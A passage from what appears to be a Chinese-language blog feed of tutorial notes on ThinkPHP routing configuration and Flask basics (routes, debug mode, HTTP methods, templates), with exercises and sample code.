class="comment">// 默认路由规则 针对模块</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MAP_RULES'</span>         =&gt;  <span class="keyword">array</span>(), <span class="comment">// URL映射定义规则</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 系统变量名称设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_MODULE'</span>            =&gt;  <span class="string">'m'</span>,     <span class="comment">// 默认模块获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ADDON'</span>             =&gt;  <span class="string">'addon'</span>,     <span class="comment">// 默认的插件控制器命名空间变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_CONTROLLER'</span>        =&gt;  <span class="string">'c'</span>,    <span class="comment">// 默认控制器获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ACTION'</span>            =&gt;  <span class="string">'a'</span>,    <span class="comment">// 默认操作获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_AJAX_SUBMIT'</span>       =&gt;  <span class="string">'ajax'</span>,  <span class="comment">// 默认的AJAX提交变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_JSONP_HANDLER'</span>     =&gt;  <span class="string">'callback'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'VAR_PATHINFO'</span>          =&gt;  <span class="string">'s'</span>,    <span class="comment">// 兼容模式PATHINFO获取变量例如 ?s=/module/action/id/1 后面的参数取决于URL_PATHINFO_DEPR</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_TEMPLATE'</span>          =&gt;  <span class="string">'t'</span>,    <span class="comment">// 默认模板切换变量</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="string">'HTTP_CACHE_CONTROL'</span>    =&gt;  <span class="string">'private'</span>,  <span class="comment">// 网页缓存控制</span></span></span><br><span class="line"><span class="php">    <span class="string">'CHECK_APP_DIR'</span>         =&gt;  <span class="keyword">true</span>,       <span class="comment">// 是否检查应用目录是否创建</span></span></span><br><span class="line"><span class="php">    <span class="string">'FILE_UPLOAD_TYPE'</span>      =&gt;  <span class="string">'Local'</span>,    <span class="comment">// 文件上传方式</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CRYPT_TYPE'</span>       =&gt;  <span class="string">'Think'</span>,    <span class="comment">// 数据加密方式</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>shiyanlou/ThinkPHP</span><br><span class="line">php -S <span class="string">localhost:</span><span class="number">8999</span></span><br></pre></td></tr></table></figure><p>cd /home/shiyanlou/ThinkPHP<br>php -S localhost:8999<br>在这里，我们访问到的是ThinkPHP自带的默认入口文件index.php也就是访问到的是IndexController的index()方法，这是因为ThinkPHP默认设置：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span></span><br></pre></td></tr></table></figure></p><p>如果你查看过ThinkPHP/Conf/convention.php文件，应该就会明白这个其实就是设置默认的控制器。</p><p>关于控制器(Controller)我们后面会仔细说，控制器的文件位于Application/Home/Controller 文件夹之下</p><p>了解这些基本知识之后，那么如果我们需要访问其它的页面，访问其他的控制器和方法呢？答案就在本节的路由教程中。</p><h2 id="路由定义规则"><a href="#路由定义规则" class="headerlink" title="路由定义规则"></a>路由定义规则</h2><p>在使用路由之前，确保你的URL支持PATH_INFO（或者兼容URL模式也可以，采用普通URL模式的情况下不支持路由功能）并且确认已开启一下的路由设置：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTER_ON'</span>   =&gt; <span class="keyword">true</span></span><br></pre></td></tr></table></figure></p><p>这里涉及到两个设置项，PATH_INFO和URL_ROUTER_ON，这些在ThinkPHP/Conf/convention.php文件都可以找到。 此处输入图片的描述 此处输入图片的描述</p><p>在满足以上两个条件之后，就可以配置路由规则了。在配置文件中使用URL_ROUTE_RULES参数进行配置，配置格式是一个数组，其格式为： ‘路由表达式’=&gt;’路由地址和传入参数’每个元素都代表一个路由规则，比如：在config.php 添加配置项<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTE_RULES'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'blogs/:year/:month/:day'</span> =&gt; <span class="keyword">array</span>(<span class="string">'Index/archive'</span>, <span class="string">'status=1'</span>),</span><br><span class="line">    <span class="string">'blogs/:id'</span>               =&gt; <span class="string">'Index/read'</span>,</span><br><span class="line">),</span><br></pre></td></tr></table></figure></p><p>ThinkPHP按定义的顺序依次匹配路由规则，一旦匹配到的话，就会定位到路由定义中的控制器和操作方法去执行（你可以传入其他的参数），而后面的规则不会继续匹配</p><p>以上的路由配置说明：在每个路由表达式中，:后面跟参数名称，比如上面的:year,:month,:id都是参数名称，以:id为例，它指向Index控制器的read方法，这个方法接受一个$id的参数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"read page with"</span> .$id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>你需要在IndexController中添加上面的代码，IndexController位于Application/Home/Controller之下</p><p>在浏览器输入<a href="http://localhost:8999/index.php/Home/blogs/2就可以看到" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/2就可以看到</a></p><p>Home就代表Home模块，你可以简单地将它映射到相应的Home目录，这是由于在默认的配置中<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span></span><br></pre></td></tr></table></figure></p><p>你可以根据自己的需求修改，但本课依旧采用默认的Home模块.</p><p>如果你还需要传入额外的参数，像第一条的规则array(‘Index/archive’, ‘status=1’)中的status一样传入，你看设置多个这样的参数。</p><p>如果你尝试在浏览器输入：</p><p><a href="http://localhost:8999/index.php/Home/blogs/string" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/string</a></p><p>ThinkPHP也给我们返回了string，但在日常的开发中，我们通常需要限制:id变量是整数，那该怎么做呢？只需要稍稍改动就可以了，写成<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'blogs</span>/:id\d'               =&gt; <span class="symbol">'Index</span>/read',</span><br></pre></td></tr></table></figure></p><p>以上\d表示限制变量id只能是数字。</p><p>对于可选参数，可以用[]包含表示，比如：</p><p>‘blogs/:year/:month/[:day]’ =&gt; array(‘Index/archive’, ‘status=1’),<br>上面的day现在就是可选参数了，你可以传入，也可以不传。</p><p>在ThinkPHP中，还支持在限制路由的后缀和使用正则路由。</p><p>限制路由后缀，通常使用在平时常见的html,htm等后缀，还是以上面的规则为例：</p><p>‘blogs/:id’               =&gt; array(‘Index/read’,array(‘ext’=&gt;’html’))<br>你就可以限制这条规则只能在.html的路由后缀生效。</p><p>2.2 正则路由<br>正则本身就是一门很大的学问，在学习ThinkPHP的正则路由之前，最好是具备一定的正则表达式的基础。</p><p>路由表达式支持的正则定义必须以/开头，否则就视为规则表达式，比如：</p><p>‘#^blog\/(\d+)$#’ =&gt; ‘Index/read’<br>这会解析为规则路由而不是正则路由，因为路由表达式并没有以/开始，所以，我们需要这样写：</p><p>‘/^new\/(\d{4})\/(\d{2})$/‘ =&gt; ‘Index/achive?year=:1&amp;month=:2’,<br>以上就是一条正确的正则路由。对于正则表达式中的每个正则规则子模式）部分(如\d{4}和\d{2})，如果需要在后面的路由地址中引用，可以采用:1、:2这样的方式，序号就是子模式的序号</p><p>2.3 静态路由<br>ThinkPHP框架其实还有一个路由机制叫静态路由，这实际上就是规则路由的静态简化版，路由定义中不包含动态参数(如上面的路由规则中id参数)，静态路由不需要遍历路由规则而是直接定位，因此执行效率会较高。静态路由采用URL_MAP_RULES来定义规则：</p><p>‘URL_ROUTER_ON’   =&gt; true,<br>‘URL_MAP_RULES’=&gt;array(<br>    ‘new/top’ =&gt; ‘Index/top?type=top’<br>)</p><p>由于Index/top?type=top中Index表示控制器，第一个top表示方法，所以我们需要在Index控制器中创建top()方法：</p><p>public function top(){<br>        echo “top page <br>“;<br>    }</p><p>你需要在IndexController中添加上面的代码，IndexController位于Application/Home/Controller之下</p><p>根据上面这条规则，如果我们访问到</p><p><a href="http://localhost:8999/index.php/Home/new/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top</a></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d7k1f0n1j30gn05x3yw.jpg" alt=""></p><p>其实我们访问的是：</p><p><a href="http://localhost:8999/index.php/Home/index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/index/top/type/top</a><br>转译成就是new/top对应的是Index控制器的top()方法，传人的参数为type，参数值为top，所以就有了index/top/type/top</p><p>但是，当我们访问<a href="http://localhost:8999/index.php/Home/new/top/var/test尽管URL地址前面也有new/top，然而由于静态路由是完整匹配的性质，所以不会匹配到index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top/var/test尽管URL地址前面也有new/top，然而由于静态路由是完整匹配的性质，所以不会匹配到index/top/type/top</a></p><h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="symbol">'URL_ROUTE_RULES'</span> =&gt; <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/:id\d'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">    <span class="symbol">'new</span>/:name'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">),</span><br></pre></td></tr></table></figure><p>在路由配置如上的情况下，修改IndexController的read()方法，使得read()方法不再绑定参数，使用$_GET方式实现访问下面的两个地址都可以正确获取相应的返回结果：</p><p><a href="http://localhost:8999/index.php/Home/new/8" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/8</a><br><a href="http://localhost:8999/index.php/Home/new/hello" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/hello</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>flask框架学习</title>
      <link href="/2019/03/23/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/23/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="flask运行及调试"><a href="#flask运行及调试" class="headerlink" title="flask运行及调试"></a>flask运行及调试</h1><h2 id="WSGI介绍"><a href="#WSGI介绍" class="headerlink" title="WSGI介绍"></a>WSGI介绍</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/on_1y/</span>article<span class="regexp">/details/</span><span class="number">18803563</span></span><br></pre></td></tr></table></figure><h2 id="一个最小的应用"><a href="#一个最小的应用" class="headerlink" title="一个最小的应用"></a>一个最小的应用</h2><p>一个最小的应用看起来像这样，新建 hello.py 文件，并向其中写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello, World!'</span></span><br></pre></td></tr></table></figure></p><p>那么这段代码做了什么？</p><p>首先我们导入了类 Flask。这个类的实例化将会是我们的 WSGI 应用。<br>接着，我们创建一个该类的实例。第一个参数是应用模块或包的名称，这样 Flask 才会知道去哪里寻找模板、静态文件等等。如果你使用的是单一的模块（就如本例），第一个参数应该使用 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们使用装饰器route()告诉 Flask 哪个URL才能触发我们的函数。</span><br><span class="line">定义一个函数，该函数名也是用来给特定函数生成 URLs，并且返回我们想要显示在用户浏览器上的信息。</span><br><span class="line">使用 Python 解释器运行这个文件，注意这个文件不能取名为flask.py，因为这会与 Flask 本身冲突。</span><br><span class="line"></span><br><span class="line">运行这个应用既可以使用 flask 命令行也可以使用 Python 的 -m 调用 flask，在运行之前你需要设置 FLASK_APP 的环境变量来告诉终端需要运行哪个应用，在终端执行如下命令：</span><br></pre></td></tr></table></figure></p><p>export FLASK_APP=hello.py<br>flask run<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">现在使用浏览器浏览http://<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">5000</span>/，将会看到页面上的 Hello, World!。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当你运行服务器，你会注意到它只能从你自己的计算机上访问，网络中其它任何的地方都不能访问。这是因为默认情况下是 debug 模式，只有应用中的一个用户可以执行你计算机上的任意 Python 代码。</span><br><span class="line"></span><br><span class="line">如果你关闭 debug 或者信任你所在网络上的用户，可以让你的服务器对外公开可用，只需要在命令行中添加参数 --host=<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:</span><br></pre></td></tr></table></figure></p><p>flask run –host=0.0.0.0</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这让你的操作系统去监听所有公开的 IP。</span><br><span class="line"></span><br><span class="line">调试模式</span><br><span class="line">使用 flask 命令行可以非常方便的启动一个本地开发服务器，但是每次修改代码后你都需要手动重启服务器。通过前面的启动后输出显示可以发现 <span class="keyword">Environment</span> 为 production，同时调试模式未开启 <span class="keyword">Debug</span> mode: off。</span><br><span class="line"></span><br><span class="line">这样做并不好，Flask 能做得更好。如果启用了调试支持，在代码修改后服务器能够自动重载，并且如果发生错误，它会提供一个有用的调试器。</span><br><span class="line"></span><br><span class="line">为了让所有的开发者特征可用（包括调试模式），在运行服务器之前可以设置 FLASK_ENV 环境变量为 development：</span><br></pre></td></tr></table></figure><p>$ export FLASK_ENV=development<br>$ export FLASK_DEBUG=1<br>$ flask run<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">上述命令做了以下几件事：</span><br><span class="line"></span><br><span class="line">使调试器（debugger）可用</span><br><span class="line">启动了代码改变自动的热加载</span><br><span class="line">在 flask 应用中开启了 <span class="builtin-name">debug</span> 模式</span><br><span class="line">注意</span><br><span class="line">尽管交互式调试器(debugger)不能在分叉(forking)环境下工作(这使得它几乎不可能在生产服务器上使用)，它依然允许执行任意代码。这使它成为一个巨大的安全风险，因此它绝对不能用于生产环境。</span><br><span class="line"></span><br><span class="line">运行中的调试器的截图，从截图可以看出在页面上有终端可以执行交互式命令:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line">route 装饰器是用于把一个函数绑定到一个 URL 上。</span><br></pre></td></tr></table></figure></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p> 如果访问 /,返回 Index Page<br>@app.route(‘/‘)<br>def index():<br>    return ‘Index Page’</p><p> 如果访问 /hello，返回 Hello, World!<br>@app.route(‘/hello’)<br>def hello():<br>    return ‘Hello, World!’<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问地址 <span class="string">http:</span><span class="comment">//127.0.0.1:5000，浏览器页面会显示 Index Page；</span></span><br><span class="line">如果访问地址 <span class="string">http:</span><span class="comment">//127.0.0.1:5000/hello，浏览器页面会显示 Hello, World!。这样就实现了通过访问不同的 URL 地址从而响应不同的页面。</span></span><br><span class="line">为了给 URL 增加变量的部分，你需要把一些特定的字段标记成&lt;variable_name&gt;。这些特定的字段将作为参数传入到你的函数中。当然也可以指定一个可选的转换器通过规则&lt;<span class="string">converter:</span>variable_name&gt;将变量值转换为特定的数据类型。</span><br><span class="line">在 <span class="regexp">/home/</span>shiyanlou<span class="regexp">/Code/</span>hello.py 文件中添加如下的代码：</span><br></pre></td></tr></table></figure></p><p>@app.route(‘/user/<username>‘)<br>def show_user_profile(username):<br>     显示用户名<br>    return ‘User &#123;&#125;’.format(username)</username></p><p>@app.route(‘/post/<a href="int:post_id" target="_blank" rel="noopener">int:post_id</a>‘)<br>def show_post(post_id):<br>     显示提交整型的用户”id”的结果，注意”int”是将输入的字符串形式转换为整型数据<br>    return ‘Post &#123;&#125;’.format(post_id)</p><p>@app.route(‘/path/<a href="path:subpath" target="_blank" rel="noopener">path:subpath</a>‘)<br>def show_subpath(subpath):<br>     显示 /path/ 之后的路径名<br>    return ‘Subpath &#123;&#125;’.format(subpath)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/user/</span>shiyanlou 时，页面显示为 User shiyanlou。</span><br><span class="line"></span><br><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/post/</span><span class="number">3</span> 时，页面显示为 Post <span class="number">3</span>。用户在浏览器地址栏上输入的都是字符串，但是在传递给 show_post 函数处理时已经被转换为了整型。</span><br><span class="line"></span><br><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/path/</span>file<span class="regexp">/A/</span>a.txt 时，页面显示为 Subpath file<span class="regexp">/A/</span>a.txt</span><br><span class="line"></span><br><span class="line">唯一 URLs <span class="regexp">/ 重定向行为</span></span><br></pre></td></tr></table></figure></p><p>@app.route(‘/projects/‘)<br>def projects():<br>    return ‘The project page’</p><p>@app.route(‘/about’)<br>def about():<br>    return ‘The about page<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">虽然它们看起来确实相似，但它们结尾斜线的使用在 <span class="built_in">URL</span> 定义中不同。</span><br><span class="line"></span><br><span class="line">第一种情况中，规范的 <span class="built_in">URL</span> 指向 projects 尾端有一个斜线/。这种感觉很像在文件系统中的文件夹。访问一个结尾不带斜线的 <span class="built_in">URL</span> 会被 Flask 重定向到带斜线的规范 <span class="built_in">URL</span> 去。</span><br><span class="line">当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/projects/ 时，页面会显示 The project page。</span><br><span class="line"></span><br><span class="line">然而，第二种情况的 <span class="built_in">URL</span> 结尾不带斜线，类似 UNIX-like 系统下的文件的路径名。此时如果访问结尾带斜线的 <span class="built_in">URL</span> 会产生一个<span class="number">404</span> “Not Found”错误。</span><br><span class="line">当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about 时，页面会显示 The about page；但是当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about/ 时，页面就会报错 Not Found。</span><br><span class="line"></span><br><span class="line">当用户访问页面忘记结尾斜线时，这个行为允许关联的 <span class="built_in">URL</span> 继续工作，并且与 Apache 和其它的服务器的行为一致，反之则不行，因此在代码的 <span class="built_in">URL</span> 设置时斜线只可多写不可少写；另外，<span class="built_in">URL</span> 会保持唯一，有助于避免搜索引擎索引同一个页面两次。</span><br><span class="line"></span><br><span class="line"><span class="comment">## HTTP方法</span></span><br><span class="line"></span><br><span class="line">默认情况下，路由只会响应 GET 请求，但是能够通过给 route() 装饰器提供 methods 参数来改变。这里是一个例子:</span><br></pre></td></tr></table></figure></p><p>@app.route(‘/login’, methods=[‘GET’, ‘POST’])<br>def login():<br>    if request.method == ‘POST’:<br>        do_the_login()    如果是 POST 方法就执行登录操作<br>    else:<br>        show_the_login_form()    如果是 GET 方法就展示登录表单<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果使用 GET 方法，HEAD 方法将会自动添加进来。你不必处理它们。也能确保 HEAD 请求会按照 HTTP RFC (文档在 HTTP 协议里面描述) 要求来处理，因此你完全可以忽略这部分 HTTP 规范。</span><br><span class="line">同样地，自从 Flask <span class="number">0.6</span> 后，OPTIONS 方法也能自动为你处理。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 练习</span></span><br><span class="line"></span><br><span class="line">请开发一个小应用，<span class="built_in">URL</span> 地址输入<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/xxx（其中 xxx 表示你的名字），访问页面会显示 xxx。</span><br><span class="line"></span><br><span class="line">请完成一个应用，当 <span class="built_in">URL</span> 是<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/<span class="built_in">sum</span>/<span class="keyword">a</span>/b时，其中<span class="keyword">a</span>和b都是数字，服务器返回它们的和。</span><br><span class="line">练习题 <span class="number">1</span> 的答案</span><br></pre></td></tr></table></figure></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p>@app.route(‘/<username>‘)<br>def get_name(username):<br>    return username<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></username></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p>@app.route(‘/sum/<a href="int:a" target="_blank" rel="noopener">int:a</a>/<a href="int:b" target="_blank" rel="noopener">int:b</a>‘)<br>def get_sum(a,b):<br>    return ‘&#123;0&#125; + &#123;1&#125; = &#123;2&#125;’.format(a,b,a+b)<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 静态文件及渲染模板</span></span><br><span class="line"><span class="meta">## 静态文件</span></span><br><span class="line">动态的 web 应用同样需要静态文件。CSS 和 JavaScript 文件通常来源于此。</span><br><span class="line">理想情况下，你的 web 服务器已经配置好为它们服务，然而在开发过程中 Flask 就能够做到。只要在你的包中或模块旁边创建一个名为<span class="keyword">static</span> 的文件夹，在应用中使用 /<span class="keyword">static</span> 即可访问。</span><br><span class="line"></span><br><span class="line">给静态文件生成 URL ，使用特殊的 <span class="keyword">static</span> 端点名</span><br><span class="line">url_for(<span class="string">'static'</span>, filename=<span class="string">'style.css'</span>)</span><br><span class="line">这个文件是应该存储在文件系统上的<span class="keyword">static</span>/style.css。</span><br><span class="line">在 Python 中生成 HTML 并不好玩，实际上是相当繁琐的，因为你必须自行做好 HTML 转义以保持应用程序的安全。由于这个原因，Flask 自动为你配置好 Jinja2 模板。</span><br><span class="line"></span><br><span class="line">你可以使用方法 render_template() 来渲染模板。所有你需要做的就是提供模板的名称以及你想要作为关键字参数传入模板的变量。</span><br><span class="line"></span><br><span class="line">这里有个渲染模板的简单例子，在 /home/shiyanlou/Code 目录下新建 hello.py 文件，并向其中添加如下代码:</span><br></pre></td></tr></table></figure></p><p>from flask import Flask, render_template<br>app = Flask(<strong>name</strong>)</p><p>@app.route(‘/hello/‘)<br>@app.route(‘/hello/<name>‘)<br>def hello(name=None):    默认 name 为 None<br>    return render_template(‘hello.html’, name=name)    将 name 参数传递到模板变量中<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flask 将会在 templates 文件夹中寻找模板。因此如果你的应用是个模块，这个文件夹在模块的旁边，如果它是一个包，那么这个文件夹在你的包里面:</span><br><span class="line"></span><br><span class="line"><span class="section">比如，应用是模块（本系列实验的应用结构都是模块型）:</span></span><br></pre></td></tr></table></figure></name></p><p>/application.py<br>/templates<br>    /hello.html<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">/application.py</span><br><span class="line">/templates</span><br><span class="line">    /hello.html</span><br></pre></td></tr></table></figure></p><p>对于模板，你可以使用 Jinja2 模板的全部能力。详细信息查看官方的 Jinja2 Template Documentation 。</p><p>在 /home/shiyanlou/Code 目录下新建 templates 文件夹并在其中新建 hello.html 文件：<br>然后向 hello.html 模板文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&amp;#123;% if name %&amp;#125;   <span class="comment">&lt;!-- 如果 name 不为空则将 name 渲染出来 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &amp;#123;&amp;#123; name &amp;#125;&amp;#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% else %&amp;#125;   <span class="comment">&lt;!-- 如果 name 为空则打印 Hello World! --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>按照前面的方法运行应用程序，当访问 <a href="http://127.0.0.1:5000/hello/" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/</a> 时页面显示 Hello World!；<br>当访问 <a href="http://127.0.0.1:5000/hello/shiyanlou" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/shiyanlou</a> 时页面显示 Hello shiyanlou!。<br>在模板中你也可以使用request，session和g对象，也能使用函数get_flashed_messages() 。</p><p>模板继承是十分有用的。如果想要知道模板继承如何工作的话，请阅读文档模板继承。基本的模板继承使得某些特定元素（如标题、导航和页脚）在每一页成为可能。</p><p>自动转义默认是开启的，因此如name包含 HTML，它将会自动转义。如果你信任一个变量，并且你知道它是安全的（例如一个模块把 wiki 标记转换到 HTML ），你可以用Markup类或|safe过滤器在模板中标记它是安全的。 在 Jinja 2 文档中，你会见到更多例子。</p><p>练习:<br>请创建一个模板和CSS文件，并在模板引入CSS文件，当访问网站首页时显示一个绿色的Hello ShiYanLou字样。关于HTML以及CSS的学习请参考在线教程<br>文件目录结构如下所示：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 